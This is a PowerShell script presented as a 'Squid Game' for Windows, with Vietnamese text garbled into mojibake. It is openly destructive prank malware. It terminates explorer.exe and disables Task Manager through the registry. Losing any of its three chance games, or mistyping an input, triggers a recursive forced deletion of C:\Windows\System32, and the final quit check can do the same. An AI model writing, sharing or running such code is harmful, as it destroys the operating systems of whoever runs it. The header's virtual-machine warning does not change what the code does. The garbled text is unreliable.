# Squid Game: Windows Edition
# üî• C·∫¢NH B√ÅO: CH·ªà CH·∫†Y TR√äN M√ÅY ·∫¢O!

# ·∫®n c·ª≠a s·ªï explorer v√† v√¥ hi·ªáu h√≥a Task Manager
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f > $null

# H√†m x√≥a System32
function Delete-System32 {
    Write-Host "System32 s·∫Ω b·ªã x√≥a trong 2 ph√∫t... Ch√∫c may m·∫Øn."
    Start-Sleep -Seconds 120
    Remove-Item -Path "C:\Windows\System32" -Recurse -Force
}

# H√†m ki·ªÉm tra n·∫øu ng∆∞·ªùi ch∆°i tho√°t game
function Check-Quit {
    if ($?) { return }
    Write-Host "B·∫°n ƒë√£ tho√°t! X√≥a System32 ngay l·∫≠p t·ª©c!"
    Remove-Item -Path "C:\Windows\System32" -Recurse -Force
    exit
}

# 1Ô∏è‚É£ Tr√≤ ch∆°i O·∫≥n T√π T√¨
function RockPaperScissors {
    Write-Host "`nüî• Tr√≤ ch∆°i 1: O·∫≥n T√π T√¨ Sinh T·ª≠"
    Write-Host "Ch·ªçn: (1) K√©o, (2) B√∫a, (3) Bao"
    
    $choices = @("K√©o", "B√∫a", "Bao")
    $computerChoice = Get-Random -Minimum 1 -Maximum 4
    $playerChoice = Read-Host "Nh·∫≠p l·ª±a ch·ªçn (1-3)"
    
    if ($playerChoice -lt 1 -or $playerChoice -gt 3) { Delete-System32; return $false }

    Write-Host "B·∫°n ch·ªçn: " $choices[$playerChoice - 1]
    Write-Host "Windows ch·ªçn: " $choices[$computerChoice - 1]

    if ($playerChoice -eq $computerChoice) {
        Write-Host "H√≤a! Ch∆°i l·∫°i..."
        return RockPaperScissors
    } elseif (($playerChoice -eq 1 -and $computerChoice -eq 3) -or
              ($playerChoice -eq 2 -and $computerChoice -eq 1) -or
              ($playerChoice -eq 3 -and $computerChoice -eq 2)) {
        Write-Host "üéâ B·∫°n th·∫Øng!"
        return $true
    } else {
        Delete-System32
        return $false
    }
}

# 2Ô∏è‚É£ Tr√≤ ch∆°i ƒêo√°n S·ªë (BO5)
function NumberGuessing {
    Write-Host "`nüî• Tr√≤ ch∆°i 2: ƒêo√°n S·ªë T·ª≠ Th·∫ßn"
    $playerScore = 0
    $computerScore = 0

    for ($i=1; $i -le 5; $i++) {
        Write-Host "V√°n $i/5: Ch·ªçn s·ªë t·ª´ 1 ƒë·∫øn 10"
        $playerGuess = Read-Host "Nh·∫≠p s·ªë c·ªßa b·∫°n"
        $computerGuess = Get-Random -Minimum 1 -Maximum 11
        $correctNumber = Get-Random -Minimum 1 -Maximum 11
        
        if ([math]::Abs($playerGuess - $correctNumber) -le 2) {
            Write-Host "‚úÖ B·∫°n ƒëo√°n ƒë√∫ng ($correctNumber)!"
            $playerScore++
        } else {
            Write-Host "‚ùå B·∫°n ƒëo√°n sai. ƒê√°p √°n: $correctNumber"
        }
        
        if ($computerGuess -eq $playerGuess) {
            Write-Host "‚ùå Windows ƒëo√°n ƒë√∫ng s·ªë c·ªßa b·∫°n ($computerGuess)!"
            $computerScore++
        }

        Write-Host "T·ª∑ s·ªë: B·∫°n [$playerScore] - Windows [$computerScore]"

        if ($playerScore -ge 3) { Write-Host "üéâ B·∫°n th·∫Øng BO5!"; return $true }
        if ($computerScore -ge 3) { Delete-System32; return $false }
    }
    
    Delete-System32
    return $false
}

# 3Ô∏è‚É£ Tr√≤ ch∆°i ƒê·∫•u S√∫ng (BO3)
function GunDuel {
    Write-Host "`nüî• Tr√≤ ch∆°i 3: ƒê·∫•u S√∫ng Sinh T·ª≠"
    $playerBullets = 0
    $computerBullets = 0
    $playerScore = 0
    $computerScore = 0

    while ($playerScore -lt 2 -and $computerScore -lt 2) {
        Write-Host "`nB·∫°n c√≥ [$playerBullets] vi√™n ƒë·∫°n | Windows c√≥ [$computerBullets] vi√™n"
        Write-Host "Ch·ªçn h√†nh ƒë·ªông: (reload/shoot/shield/bomb)"
        $playerAction = Read-Host "Nh·∫≠p h√†nh ƒë·ªông"
        Start-Sleep -Seconds (Get-Random -Minimum 1.5 -Maximum 10)
        $computerAction = if ($computerBullets -eq 0) { "reload" } else { Get-Random -InputObject "reload", "shoot", "shield" }

        Write-Host "Windows ch·ªçn: $computerAction"

        if ($playerAction -eq "reload") { $playerBullets++ }
        if ($computerAction -eq "reload") { $computerBullets++ }

        if ($playerAction -eq "shoot") {
            if ($playerBullets -le 0) { Delete-System32; return $false }
            if ($computerAction -eq "reload") { $playerScore++ }
            if ($computerAction -eq "shield") { Write-Host "Windows ch·∫∑n ƒë∆∞·ª£c ƒë·∫°n!" }
            $playerBullets--
        }

        if ($computerAction -eq "shoot") {
            if ($computerBullets -le 0) { $playerScore++; continue }
            if ($playerAction -eq "reload") { $computerScore++ }
            if ($playerAction -eq "shield") { Write-Host "B·∫°n ch·∫∑n ƒë∆∞·ª£c ƒë·∫°n!" }
            $computerBullets--
        }

        if ($playerAction -eq "bomb" -and $playerBullets -ge 5) { Write-Host "üí• B·∫°n th·∫Øng ngay l·∫≠p t·ª©c!"; return $true }
        if ($computerAction -eq "bomb" -and $computerBullets -ge 5) { Delete-System32; return $false }

        Write-Host "T·ª∑ s·ªë: B·∫°n [$playerScore] - Windows [$computerScore]"
    }

    if ($playerScore -ge 2) { Write-Host "üéâ B·∫°n th·∫Øng BO3!"; return $true }
    Delete-System32
    return $false
}

# B·∫Øt ƒë·∫ßu tr√≤ ch∆°i
if (RockPaperScissors) {
    if (NumberGuessing) {
        if (GunDuel) {
            Write-Host "`nüéâ B·∫°n ƒë√£ th·∫Øng c·∫£ 3 tr√≤ ch∆°i! Ch√∫c m·ª´ng!"
            Write-Host "CREDIT: ƒê∆∞·ª£c ph√°t tri·ªÉn b·ªüi Itz Mina Meo Meo"
            Start-Process explorer.exe
            exit
        }
    }
}

Check-Quit
